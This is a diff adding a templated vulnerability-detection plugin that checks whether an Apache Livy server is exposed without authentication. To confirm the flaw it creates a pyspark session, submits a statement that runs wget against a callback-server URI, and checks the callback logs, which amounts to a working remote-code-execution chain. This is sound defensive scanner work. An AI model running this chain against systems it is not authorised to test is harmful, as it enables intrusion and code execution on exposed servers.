@@ -1,0 +1,149 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheLivy_ExposedUI"
+  author: "joernNNN"
+  version: "0.1"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "APACHELIVY_EXPOSED_UI"
+  }
+  title: "Apache Livy Exposed instance"
+  description: "Apache Livy instance is exposed and can be used to compromise the system."
+  recommendation:
+    "Configure authentication or ensure the Apache Livy instance is not exposed "
+    "to the network. See "
+    "https://livy.apache.org/get-started/ for details."
+  severity: CRITICAL
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "livy_exposed_ui_fingerprint"
+  http_request: {
+    method: GET
+    uri: "/ui"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: '<title>Livy - Sessions</title>' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_sessions"
+  http_request: {
+    method: POST
+    uri: "/sessions"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"kind":"pyspark"}'
+    response: {
+      http_status: 201
+      expect_all: {
+        conditions: { body {} contains: '"proxyUser"' }
+        conditions: { body {} contains: '"kind"' }
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"id\":([0-9]+),"
+            variable_name: "sessionid"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep_for_session_creation"
+  utility: { sleep: { duration_ms: 60000 } }
+}
+
+actions: {
+  name: "create_statements"
+  http_request: {
+    method: POST
+    uri: "/sessions/{{ sessionid }}/statements"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data:'{"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"}'
+    response: {
+      http_status: 201
+      expect_all: {
+        conditions: { body {} contains: '"code"' }
+        conditions: { body {} contains: '"state"' }
+        conditions: { body {} contains: '"output"' }
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"id\":([0-9]+),"
+            variable_name: "statementid"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_statements"
+  http_request: {
+    method: GET
+    uri: "/sessions/{{ sessionid }}/statements/{{ statementid }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: '"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"' }
+        conditions: { body {} contains: '"id"' }
+        conditions: { body {} contains: '"output"' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep_for_callback"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "livy_exposed_ui_fingerprint",
+    "create_sessions",
+    "sleep_for_session_creation",
+    "create_statements",
+    "execute_statements",
+    "sleep_for_callback",
+    "check_callback_server_logs"
+  ]
+}
